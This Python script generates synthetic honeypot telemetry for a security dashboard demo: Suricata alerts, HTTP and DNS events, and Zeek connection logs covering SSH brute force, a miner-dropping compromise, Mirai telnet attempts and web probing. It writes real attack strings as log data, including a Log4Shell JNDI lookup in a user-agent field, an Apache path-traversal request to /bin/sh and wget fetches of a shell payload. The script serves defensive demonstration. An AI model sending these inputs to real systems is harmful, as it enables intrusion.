#!/usr/bin/env python3
"""
Generate SYNTHETIC honeypot telemetry for the SIRA public demo.

Everything here is fabricated: IPs, ISPs, payloads, timelines. It mimics what a
small internet-facing honeypot (Cowrie + Suricata + Zeek) records, so the demo
looks and behaves like the real deployment without needing a server.

Outputs (in demo/data/):
  eve.json      Suricata EVE-style events (alert, http, dns, tls, flow)
  conn.log      Zeek conn.log (tab separated)
  geoip.json    ip -> fake geo/ISP metadata
  campaigns.json  ground-truth description of each synthetic campaign
"""
import json
import os
import random
from datetime import datetime, timedelta, timezone

random.seed(20261019)

OUT = os.path.join(os.path.dirname(__file__), "data")
os.makedirs(OUT, exist_ok=True)

HONEYPOT_IP = "10.0.0.4"          # private address of the honeypot VM
RESOLVER_IP = "10.0.0.2"
END = datetime(2026, 10, 19, 6, 0, 0, tzinfo=timezone.utc)
START = END - timedelta(days=6)

# --------------------------------------------------------------------------
# Synthetic attackers: (ip, country, cc, city, lat, lon, fake isp, campaign)
# --------------------------------------------------------------------------
ATTACKERS = [
    # SSH brute force -> successful login -> payload -> miner (the "story" campaign)
    ("185.231.77.14",  "Netherlands",   "NL", "Amsterdam",   52.37,   4.90, "Demo Hosting BV",        "ssh_compromise"),
    ("45.142.200.63",  "Russia",        "RU", "Moscow",      55.75,  37.62, "Example Telecom JSC",    "ssh_bruteforce"),
    ("103.77.192.208", "China",         "CN", "Shenzhen",    22.54, 114.06, "Sample Net Co.",         "ssh_bruteforce"),
    ("218.92.41.7",    "China",         "CN", "Nanjing",     32.06, 118.80, "Sample Net Co.",         "ssh_bruteforce"),
    ("159.65.23.190",  "Singapore",     "SG", "Singapore",    1.35, 103.82, "Demo Cloud Pte",         "ssh_bruteforce"),
    ("91.240.118.52",  "Ukraine",       "UA", "Kyiv",        50.45,  30.52, "Example Hosting UA",     "ssh_bruteforce"),
    ("167.99.140.31",  "United States", "US", "New York",    40.71, -74.01, "Demo Cloud Inc",         "ssh_bruteforce"),
    # Telnet / IoT botnet
    ("177.54.133.9",   "Brazil",        "BR", "Sao Paulo",  -23.55, -46.63, "Example Broadband SA",   "mirai_telnet"),
    ("14.162.88.201",  "Vietnam",       "VN", "Hanoi",       21.03, 105.85, "Sample Telecom VN",      "mirai_telnet"),
    ("201.76.12.144",  "Argentina",     "AR", "Buenos Aires",-34.60, -58.38, "Example Cable AR",      "mirai_telnet"),
    ("123.25.41.77",   "Vietnam",       "VN", "Ho Chi Minh", 10.82, 106.63, "Sample Telecom VN",      "mirai_telnet"),
    # Log4Shell / web exploitation
    ("193.32.162.45",  "Germany",       "DE", "Frankfurt",   50.11,   8.68, "Demo Hosting GmbH",      "web_exploit"),
    ("20.171.207.88",  "United States", "US", "Boydton",     36.67, -78.39, "Demo Cloud Inc",         "web_exploit"),
    ("94.102.61.30",   "Netherlands",   "NL", "Amsterdam",   52.37,   4.90, "Demo Hosting BV",        "web_exploit"),
    # Mass scanners
    ("167.94.138.12",  "United States", "US", "Ann Arbor",   42.28, -83.74, "Research Scanner Net",   "scanner"),
    ("71.6.135.131",   "United States", "US", "San Diego",   32.72,-117.16, "Research Scanner Net",   "scanner"),
    ("198.235.24.90",  "United States", "US", "Chicago",     41.88, -87.63, "Research Scanner Net",   "scanner"),
    ("80.82.77.139",   "Netherlands",   "NL", "Amsterdam",   52.37,   4.90, "Demo Hosting BV",        "scanner"),
    ("162.142.125.55", "United States", "US", "Ann Arbor",   42.28, -83.74, "Research Scanner Net",   "scanner"),
    # SMB / RDP / DB probing
    ("222.186.30.112", "China",         "CN", "Zhenjiang",   32.19, 119.45, "Sample Net Co.",         "smb_rdp"),
    ("141.98.11.33",   "Lithuania",     "LT", "Vilnius",     54.69,  25.28, "Example Hosting LT",     "smb_rdp"),
    ("89.248.165.74",  "Netherlands",   "NL", "Amsterdam",   52.37,   4.90, "Demo Hosting BV",        "smb_rdp"),
    ("43.134.66.10",   "Hong Kong",     "HK", "Hong Kong",   22.32, 114.17, "Demo Cloud Ltd",         "db_probe"),
    ("37.49.230.18",   "France",        "FR", "Paris",       48.86,   2.35, "Example Hosting FR",     "db_probe"),
    ("205.210.31.77",  "United States", "US", "Ashburn",     39.04, -77.49, "Demo Cloud Inc",         "db_probe"),
    # Payload host (only seen serving the malware the compromised session pulls)
    ("62.204.41.190",  "Russia",        "RU", "Saint Petersburg", 59.93, 30.34, "Example Telecom JSC","payload_host"),
    # Mining pool (outbound destination)
    ("51.222.30.101",  "Canada",        "CA", "Montreal",    45.50, -73.57, "Demo Cloud Ltd",         "miner_pool"),
]
GEO = {a[0]: {"country": a[1], "country_code": a[2], "city": a[3], "lat": a[4], "lon": a[5], "isp": a[6]}
       for a in ATTACKERS}
BY_CAMPAIGN = {}
for a in ATTACKERS:
    BY_CAMPAIGN.setdefault(a[7], []).append(a[0])

# --------------------------------------------------------------------------
events = []
zeek = []
flow_id_counter = [random.randint(10**14, 10**15)]


def fid():
    flow_id_counter[0] += random.randint(1, 5000)
    return flow_id_counter[0]


def ts_str(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{dt.microsecond:06d}+0000"


def rand_time(lo=None, hi=None):
    lo = lo or START
    hi = hi or END
    return lo + timedelta(seconds=random.random() * (hi - lo).total_seconds())


def sport():
    return random.randint(32768, 61000)


ALERT_META = {"attack_target": ["Server"], "deployment": ["Perimeter"], "signature_severity": ["Major"],
              "created_at": ["2020_01_01"], "updated_at": ["2024_03_01"]}


def add_alert(t, src, dst, sp, dp, proto, sig, sid, cat, sev, app_proto=None, flow_extra=None, direction="to_server"):
    ev = {
        "timestamp": ts_str(t), "flow_id": fid(), "in_iface": "eth0", "event_type": "alert",
        "src_ip": src, "src_port": sp, "dest_ip": dst, "dest_port": dp, "proto": proto, "ip_v": 4,
        "pkt_src": "wire/pcap",
        "alert": {"action": "allowed", "gid": 1, "signature_id": sid, "rev": random.randint(1, 8),
                  "signature": sig, "category": cat, "severity": sev, "metadata": ALERT_META},
        "direction": direction,
        "flow": {"pkts_toserver": random.randint(1, 40), "pkts_toclient": random.randint(0, 30),
                 "bytes_toserver": random.randint(60, 4000), "bytes_toclient": random.randint(0, 6000),
                 "start": ts_str(t), "src_ip": src, "dest_ip": dst, "src_port": sp, "dest_port": dp},
    }
    if app_proto:
        ev["app_proto"] = app_proto
    events.append(ev)
    return ev


def add_flow(t, src, dst, sp, dp, proto="TCP", app=None, alerted=False, state="closed", reason="timeout"):
    dur = random.choice([0, 0, 1, 2, 3, 12, 40, 118])
    ev = {
        "timestamp": ts_str(t + timedelta(seconds=dur)), "flow_id": fid(), "in_iface": "eth0",
        "event_type": "flow", "src_ip": src, "src_port": sp, "dest_ip": dst, "dest_port": dp,
        "ip_v": 4, "proto": proto,
        "flow": {"pkts_toserver": random.randint(1, 30), "pkts_toclient": random.randint(0, 25),
                 "bytes_toserver": random.randint(54, 3500), "bytes_toclient": random.randint(0, 5000),
                 "start": ts_str(t), "end": ts_str(t + timedelta(seconds=dur)), "age": dur,
                 "state": state, "reason": reason, "alerted": alerted},
    }
    if app:
        ev["app_proto"] = app
    events.append(ev)
    # mirror into Zeek conn.log
    conn_state = random.choice(["S0", "S0", "S1", "SF", "REJ", "RSTO", "RSTR", "SH"])
    zeek.append((t, src, sp, dst, dp, proto.lower(), app or "-", dur, conn_state))


def add_http(t, src, dst, sp, dp, method, url, status, ctype="text/html", ua="-", host=None, length=None):
    ev = {
        "timestamp": ts_str(t), "flow_id": fid(), "in_iface": "eth0", "event_type": "http",
        "src_ip": src, "src_port": sp, "dest_ip": dst, "dest_port": dp, "proto": "TCP", "ip_v": 4,
        "pkt_src": "wire/pcap", "tx_id": 0,
        "http": {"hostname": host or HONEYPOT_IP, "url": url, "http_user_agent": ua,
                 "http_content_type": ctype, "http_method": method, "protocol": "HTTP/1.1",
                 "status": status, "length": length if length is not None else random.randint(0, 1800)},
    }
    events.append(ev)


def add_dns(t, src, dst, sp, name, rtype="A", rcode="NOERROR"):
    events.append({
        "timestamp": ts_str(t), "flow_id": fid(), "in_iface": "eth0", "event_type": "dns",
        "src_ip": src, "src_port": sp, "dest_ip": dst, "dest_port": 53, "proto": "UDP", "ip_v": 4,
        "pkt_src": "wire/pcap",
        "dns": {"version": 3, "type": "request", "tx_id": 0, "id": random.randint(1, 65000), "flags": "100",
                "rd": True, "opcode": 0, "rrname": name, "rrtype": rtype, "rcode": rcode,
                "queries": [{"rrname": name, "rrtype": rtype}]},
    })


def add_tls(t, src, dst, sp, dp, sni, version="TLS 1.3"):
    events.append({
        "timestamp": ts_str(t), "flow_id": fid(), "in_iface": "eth0", "event_type": "tls",
        "src_ip": src, "src_port": sp, "dest_ip": dst, "dest_port": dp, "proto": "TCP", "ip_v": 4,
        "pkt_src": "wire/pcap",
        "tls": {"subject": f"CN={sni}", "issuerdn": "C=US, O=Demo CA, CN=Demo CA R3",
                "serial": "%032X" % random.getrandbits(128), "fingerprint": ":".join("%02x" % random.randint(0, 255) for _ in range(20)),
                "sni": sni, "version": version, "notbefore": "2026-08-01T00:00:00", "notafter": "2026-10-30T00:00:00",
                "ja3": {"hash": "%032x" % random.getrandbits(128)}},
    })


# --------------------------------------------------------------------------
# Campaign generators
# --------------------------------------------------------------------------
campaigns = []


def ssh_bruteforce(ip, n_bursts, intensity, compromise=False):
    sigs = [
        ("ET SCAN Potential SSH Scan", 2001219, "Attempted Information Leak", 2),
        ("ET SCAN LibSSH Based SSH Connection - Often used as a Brute Force Attack", 2006546, "Attempted Administrator Privilege Gain", 1),
        ("LOCAL HONEYPOT SSH Authentication Failure Burst (Cowrie)", 9000001, "Attempted Administrator Privilege Gain", 1),
    ]
    first = None
    for _ in range(n_bursts):
        t0 = rand_time(START, END - timedelta(hours=2))
        first = t0 if first is None or t0 < first else first
        for i in range(random.randint(*intensity)):
            t = t0 + timedelta(seconds=i * random.uniform(1.5, 9))
            s = random.choices(sigs, weights=[3, 4, 3])[0]
            add_alert(t, ip, HONEYPOT_IP, sport(), 22, "TCP", s[0], s[1], s[2], s[3], app_proto="ssh")
            if random.random() < 0.5:
                add_flow(t, ip, HONEYPOT_IP, sport(), 22, app="ssh", alerted=True)
    return first


def ssh_compromise(ip, payload_ip, pool_ip):
    """Full kill chain: scan -> brute force -> login -> wget payload -> miner."""
    day = START + timedelta(days=3, hours=14, minutes=22)
    story = []
    # 1. recon
    for i in range(5):
        t = day + timedelta(seconds=i * 3)
        add_alert(t, ip, HONEYPOT_IP, sport(), [22, 23, 80, 443, 3306][i], "TCP",
                  "ET SCAN Potential SSH Scan" if i == 0 else "ET SCAN Suspicious inbound to mySQL port 3306" if i == 4 else "ET SCAN Nmap Scripting Engine User-Agent Detected (Nmap Scripting Engine)",
                  2001219 if i == 0 else 2010937, "Detection of a Network Scan", 2)
    story.append("recon")
    # 2. brute force
    t = day + timedelta(minutes=1)
    for i in range(70):
        tt = t + timedelta(seconds=i * random.uniform(1, 4))
        add_alert(tt, ip, HONEYPOT_IP, sport(), 22, "TCP",
                  "ET SCAN LibSSH Based SSH Connection - Often used as a Brute Force Attack" if i % 2 else "LOCAL HONEYPOT SSH Authentication Failure Burst (Cowrie)",
                  2006546 if i % 2 else 9000001, "Attempted Administrator Privilege Gain", 1, app_proto="ssh")
    story.append("bruteforce")
    # 3. successful login + payload download from the payload host
    t_login = day + timedelta(minutes=5, seconds=41)
    add_alert(t_login, ip, HONEYPOT_IP, sport(), 22, "TCP",
              "LOCAL HONEYPOT SSH Successful Login With Default Credentials (root)", 9000002,
              "Attempted Administrator Privilege Gain", 1, app_proto="ssh")
    t_dl = t_login + timedelta(seconds=19)
    add_alert(t_dl, HONEYPOT_IP, payload_ip, sport(), 80, "TCP",
              "ET MALWARE Linux/Mirai.Variant Binary Download (wget)", 2034789, "A Network Trojan was detected", 1,
              app_proto="http", direction="to_server")
    for u in ["/bins/x86_64.sh", "/bins/arm7"]:
        add_http(t_dl + timedelta(seconds=1), HONEYPOT_IP, payload_ip, sport(), 80, "GET", u, 200,
                 ctype="application/x-sh", ua="Wget/1.21.4", host=payload_ip, length=random.randint(900, 90000))
    story.append("payload download")
    # 4. cryptominer outbound
    for i in range(14):
        t = t_dl + timedelta(minutes=2, seconds=i * 30)
        add_alert(t, HONEYPOT_IP, pool_ip, sport(), 3333, "TCP",
                  "ET MALWARE Possible Cryptocurrency Miner Stratum Login (XMRig)", 2025879,
                  "Crypto Currency Mining Activity Detected", 1, app_proto="failed", direction="to_server")
        add_flow(t, HONEYPOT_IP, pool_ip, sport(), 3333, alerted=True, state="established", reason="timeout")
    add_dns(t_dl + timedelta(minutes=2), HONEYPOT_IP, RESOLVER_IP, sport(), "pool.minexmr-demo.net")
    story.append("cryptominer")
    campaigns.append({"id": "C-01", "name": "SSH compromise -> Mirai-style payload -> Monero miner",
                      "attacker": ip, "payload_host": payload_ip, "mining_pool": pool_ip,
                      "start": ts_str(day), "stages": story, "mitre": ["T1595", "T1110", "T1105", "T1496"]})


def mirai_telnet(ip):
    sigs = [
        ("ET EXPLOIT Default Credential Login Attempt (Telnet root/xc3511)", 2034120, "Attempted Administrator Privilege Gain", 1),
        ("ET SCAN Mirai Variant Telnet Scan (SYN Window 28 Bytes)", 2024511, "Detection of a Network Scan", 2),
        ("ET MALWARE Mirai Botnet Telnet Login Attempt", 2023898, "A Network Trojan was detected", 1),
    ]
    for _ in range(random.randint(2, 4)):
        t0 = rand_time(START, END - timedelta(hours=1))
        for i in range(random.randint(10, 35)):
            t = t0 + timedelta(seconds=i * random.uniform(0.5, 6))
            s = random.choice(sigs)
            add_alert(t, ip, HONEYPOT_IP, sport(), random.choice([23, 23, 2323]), "TCP", s[0], s[1], s[2], s[3])
            if random.random() < 0.4:
                add_flow(t, ip, HONEYPOT_IP, sport(), 23, alerted=True)


WEB_PATHS = [
    ("/.env", "ET WEB_SERVER Possible .env Configuration File Access Attempt", 2036112, "Web Application Attack", 2),
    ("/wp-login.php", "ET WEB_SPECIFIC_APPS WordPress Login Brute Force Attempt", 2012978, "Web Application Attack", 2),
    ("/phpmyadmin/index.php", "ET SCAN Possible phpMyAdmin Scan", 2009800, "Web Application Attack", 2),
    ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "ET WEB_SPECIFIC_APPS PHPUnit eval-stdin.php Remote Code Execution Attempt", 2025701, "Web Application Attack", 1),
    ("/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", "ET EXPLOIT Apache HTTP Server 2.4.49 Path Traversal (CVE-2021-41773)", 2034190, "Web Application Attack", 1),
    ("/actuator/gateway/routes", "ET EXPLOIT Spring Cloud Gateway RCE Attempt (CVE-2022-22947)", 2035500, "Web Application Attack", 1),
    ("/boaform/admin/formLogin", "ET EXPLOIT Boa Web Server Auth Bypass Attempt", 2030009, "Attempted Administrator Privilege Gain", 1),
]
UAS = ["curl/7.88.1", "python-requests/2.31.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0",
       "Go-http-client/1.1", "Mozilla/5.0 zgrab/0.x", "libwww-perl/6.67", "Nmap Scripting Engine"]


def web_exploit(ip):
    for _ in range(random.randint(3, 6)):
        t0 = rand_time(START, END - timedelta(hours=1))
        for i in range(random.randint(6, 24)):
            t = t0 + timedelta(seconds=i * random.uniform(0.4, 5))
            if random.random() < 0.28:
                add_alert(t, ip, HONEYPOT_IP, sport(), 8080, "TCP",
                          "ET EXPLOIT Apache log4j RCE Attempt (http ldap) (CVE-2021-44228)", 2034647,
                          "Web Application Attack", 1, app_proto="http")
                add_http(t, ip, HONEYPOT_IP, sport(), 8080, "GET", "/", 400,
                         ua="${jndi:ldap://%s:1389/a}" % ip, length=0)
            else:
                p = random.choice(WEB_PATHS)
                add_alert(t, ip, HONEYPOT_IP, sport(), 80, "TCP", p[1], p[2], p[3], p[4], app_proto="http")
                add_http(t, ip, HONEYPOT_IP, sport(), 80, random.choice(["GET", "GET", "POST"]), p[0],
                         random.choice([404, 404, 403, 200, 401]), ua=random.choice(UAS))


def scanner(ip):
    for _ in range(random.randint(4, 8)):
        t0 = rand_time(START, END - timedelta(minutes=30))
        for i in range(random.randint(5, 16)):
            t = t0 + timedelta(seconds=i * random.uniform(0.2, 3))
            dp = random.choice([21, 22, 25, 80, 110, 143, 443, 445, 993, 3389, 5900, 8080, 8443])
            if random.random() < 0.35:
                add_alert(t, ip, HONEYPOT_IP, sport(), dp, "TCP",
                          random.choice(["ET SCAN Zmap User-Agent (Inbound)", "ET SCAN Masscan Detected",
                                         "ET SCAN Nmap Scripting Engine User-Agent Detected (Nmap Scripting Engine)"]),
                          random.choice([2024364, 2024897, 2009358]), "Detection of a Network Scan", 2)
            add_flow(t, ip, HONEYPOT_IP, sport(), dp, state="new", reason="timeout")
            if dp in (80, 8080) and random.random() < 0.6:
                add_http(t, ip, HONEYPOT_IP, sport(), dp, "GET", "/", 200,
                         ua=random.choice(["Mozilla/5.0 (compatible; CensysInspect/1.1)", "Mozilla/5.0 zgrab/0.x", "-"]))
            if dp == 443 and random.random() < 0.5:
                add_tls(t, ip, HONEYPOT_IP, sport(), 443, "-")


def smb_rdp(ip):
    for _ in range(random.randint(3, 6)):
        t0 = rand_time(START, END - timedelta(hours=1))
        for i in range(random.randint(8, 28)):
            t = t0 + timedelta(seconds=i * random.uniform(0.5, 5))
            r = random.random()
            if r < 0.4:
                add_alert(t, ip, HONEYPOT_IP, sport(), 445, "TCP",
                          "ET EXPLOIT ETERNALBLUE Probe MS17-010 (Possible DoublePulsar)", 2025650,
                          "Attempted Administrator Privilege Gain", 1, app_proto="smb")
            elif r < 0.75:
                add_alert(t, ip, HONEYPOT_IP, sport(), 3389, "TCP",
                          "ET SCAN Potential RDP Brute Force (Hydra-style mstshash)", 2023753,
                          "Attempted Administrator Privilege Gain", 2)
            else:
                add_alert(t, ip, HONEYPOT_IP, sport(), 5900, "TCP",
                          "ET SCAN Potential VNC Scan 5900-5920", 2002920, "Detection of a Network Scan", 2)
            add_flow(t, ip, HONEYPOT_IP, sport(), random.choice([445, 3389, 5900]), alerted=True)


def db_probe(ip):
    for _ in range(random.randint(3, 5)):
        t0 = rand_time(START, END - timedelta(hours=1))
        for i in range(random.randint(5, 16)):
            t = t0 + timedelta(seconds=i * random.uniform(1, 7))
            dp, sig, sid = random.choice([
                (6379, "ET EXPLOIT Redis Unauthenticated Command Execution Attempt (CONFIG SET dir)", 2034001),
                (3306, "ET SCAN Suspicious inbound to mySQL port 3306", 2010937),
                (1433, "ET SCAN Suspicious inbound to MSSQL port 1433", 2010935),
                (5432, "ET SCAN Suspicious inbound to PostgreSQL port 5432", 2010939),
                (27017, "ET SCAN Suspicious inbound to MongoDB port 27017", 2034001),
            ])
            add_alert(t, ip, HONEYPOT_IP, sport(), dp, "TCP", sig, sid, "Potentially Bad Traffic", 2)
            add_flow(t, ip, HONEYPOT_IP, sport(), dp, alerted=True)


# run campaigns
compromiser = BY_CAMPAIGN["ssh_compromise"][0]
ssh_compromise(compromiser, BY_CAMPAIGN["payload_host"][0], BY_CAMPAIGN["miner_pool"][0])
for ip in BY_CAMPAIGN["ssh_bruteforce"]:
    ssh_bruteforce(ip, random.randint(3, 7), (8, 40))
for ip in BY_CAMPAIGN["mirai_telnet"]:
    mirai_telnet(ip)
for ip in BY_CAMPAIGN["web_exploit"]:
    web_exploit(ip)
for ip in BY_CAMPAIGN["scanner"]:
    scanner(ip)
for ip in BY_CAMPAIGN["smb_rdp"]:
    smb_rdp(ip)
for ip in BY_CAMPAIGN["db_probe"]:
    db_probe(ip)

# the compromiser also keeps coming back
ssh_bruteforce(compromiser, 12, (15, 30))

# Background noise: benign-looking DNS / TLS / outbound flows from the honeypot VM
for _ in range(260):
    t = rand_time()
    name = random.choice(["ntp.ubuntu.com", "archive.ubuntu.com", "security.ubuntu.com",
                          "azure.archive.ubuntu.com", "time.windows.com", "metadata.azure.internal"])
    add_dns(t, HONEYPOT_IP, RESOLVER_IP, sport(), name)
for _ in range(90):
    t = rand_time()
    add_tls(t, HONEYPOT_IP, "91.189.91.39", sport(), 443, "archive.ubuntu.com")
for _ in range(120):
    t = rand_time()
    add_flow(t, HONEYPOT_IP, random.choice(["91.189.91.39", "13.107.4.50"]), sport(), 443, app="tls",
             state="closed", reason="timeout")

# Extra inbound DNS (open-resolver probing) so the dns dashboard is not empty
for _ in range(70):
    t = rand_time()
    ip = random.choice(BY_CAMPAIGN["scanner"] + BY_CAMPAIGN["db_probe"])
    add_dns(t, ip, HONEYPOT_IP, sport(), random.choice(["version.bind", "isc.org", "google.com", "."]),
            rtype=random.choice(["TXT", "A", "ANY"]))

events.sort(key=lambda e: e["timestamp"])
zeek.sort(key=lambda z: z[0])

with open(os.path.join(OUT, "eve.json"), "w") as f:
    for e in events:
        f.write(json.dumps(e) + "\n")

header = ("#separator \\x09\n#set_separator\t,\n#empty_field\t(empty)\n#unset_field\t-\n#path\tconn\n"
          "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tservice\tduration\torig_bytes\tresp_bytes\tconn_state\n")
with open(os.path.join(OUT, "conn.log"), "w") as f:
    f.write(header)
    for t, s, sp, d, dp, proto, svc, dur, st in zeek:
        uid = "C" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
        f.write("\t".join([f"{t.timestamp():.6f}", uid, s, str(sp), d, str(dp), proto, svc, f"{dur:.6f}",
                           str(random.randint(0, 900)), str(random.randint(0, 2400)), st]) + "\n")

with open(os.path.join(OUT, "geoip.json"), "w") as f:
    json.dump(GEO, f, indent=1)
with open(os.path.join(OUT, "campaigns.json"), "w") as f:
    json.dump(campaigns, f, indent=1)

from collections import Counter
c = Counter(e["event_type"] for e in events)
print("events:", len(events), dict(c))
print("zeek conns:", len(zeek))
print("unique external src:", len({e["src_ip"] for e in events if not e["src_ip"].startswith("10.")}))
